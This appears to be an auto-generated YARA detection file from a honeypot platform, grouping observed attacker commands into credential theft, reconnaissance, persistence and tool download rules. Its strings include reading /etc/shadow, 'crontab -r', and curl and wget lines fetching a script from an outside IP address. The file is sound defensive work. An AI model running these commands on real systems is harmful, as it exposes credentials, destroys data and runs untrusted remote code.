// LLM Honeypot Intelligence Platform - YARA Rules
// Generated: 20260414_1748
// Source: Elasticsearch honeypot data (24h window)

rule Honeypot_CredentialTheft {
    meta:
        description = "LLM Honeypot Intelligence - CredentialTheft pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-04-14"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "2"
        unique_patterns = "2"
    strings:
        $s0 = "cat /etc/passwd 2>/dev/null" ascii nocase
        $s1 = "cat /etc/shadow 2>/dev/null" ascii nocase
    condition:
        any of them
}

rule Honeypot_SystemRecon {
    meta:
        description = "LLM Honeypot Intelligence - SystemRecon pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-04-14"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "977"
        unique_patterns = "12"
    strings:
        $s0 = "cat /proc/cpuinfo" ascii nocase
        $s1 = "lspci" ascii nocase
        $s2 = "kill -9 $pid 2>/dev/null" ascii nocase
        $s3 = "nproc --all" ascii nocase
        $s4 = "ip addr show 2>/dev/null" ascii nocase
        $s5 = "uname -a" ascii nocase
        $s6 = "lscpu" ascii nocase
        $s7 = "uname -m 2>/dev/null" ascii nocase
        $s8 = "nproc 2>/dev/null" ascii nocase
        $s9 = "uname -s -v -n -r -m" ascii nocase
        $s10 = "ps aux" ascii nocase
        $s11 = "/bin/./uname -s -v -n -r -m" ascii nocase
    condition:
        any of them
}

rule Honeypot_Persistence {
    meta:
        description = "LLM Honeypot Intelligence - Persistence pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-04-14"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "3"
        unique_patterns = "2"
    strings:
        $s0 = "systemctl list-units --type=service --state=running 2>/dev/null" ascii nocase
        $s1 = "crontab -r" ascii nocase
    condition:
        any of them
}

rule Honeypot_ToolDownload {
    meta:
        description = "LLM Honeypot Intelligence - ToolDownload pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-04-14"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "11"
        unique_patterns = "9"
    strings:
        $s0 = "scp -qt \"/tmp/xOjPSMpn" ascii nocase
        $s1 = "curl ipinfo.io/org" ascii nocase
        $s2 = "curl -sk https://46.151.182.82/sh" ascii nocase
        $s3 = "scp -qt \"/var/tmp/xOjPSMpn" ascii nocase
        $s4 = "scp -qt \"/tmp/irToIbNv" ascii nocase
        $s5 = "wget --no-check-certificate -qO- https://46.151.182.82/sh" ascii nocase
        $s6 = "scp -qt \"/var/tmp/irToIbNv" ascii nocase
        $s7 = "scp -qt \"/dev/shm/xOjPSMpn" ascii nocase
        $s8 = "scp -qt \"/dev/shm/irToIbNv" ascii nocase
    condition:
        any of them
}